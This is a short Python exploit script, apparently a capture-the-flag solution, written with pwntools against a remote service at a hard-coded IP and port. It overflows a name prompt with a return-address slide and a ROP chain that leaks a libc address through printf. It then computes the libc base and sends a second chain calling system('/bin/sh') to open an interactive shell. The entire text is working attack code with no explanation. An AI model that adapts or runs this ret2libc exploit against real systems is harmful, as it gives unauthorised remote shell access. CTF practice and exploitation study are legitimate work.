from pwn import *
#io = process("./wall")
io = remote("34.170.146.252",40015)
libc = ELF("./libc.so.6")

main_ret = p64(0x401262)
printf_plt = p64(0x401070)
entry_point = p64(0x401090)
io.sendlineafter(b"Message:", b"A")

# leak libc
retslide = main_ret*(128//8)
rop = printf_plt + entry_point

name = retslide[:128-len(rop)] + rop 
io.sendlineafter(b"What is your name?", name)

io.recvuntil(b'"A"\n')
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - libc.symbols["funlockfile"]
log.info("LIBC BASE: " + hex(libc.address))


# ret2libc
pop_rdi = p64(libc.address + 0x2a3e5)
binsh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols["system"])

io.sendlineafter(b"Message:", b"A")
retslide = main_ret*(128//8)
rop = pop_rdi + binsh + system + main_ret  # add ret at end cause movaps issue

name = retslide[:128-len(rop)] + rop
#gdb.attach(io,gdbscript="break *0x401262")
io.sendlineafter(b"What is your name?", name)

io.interactive()
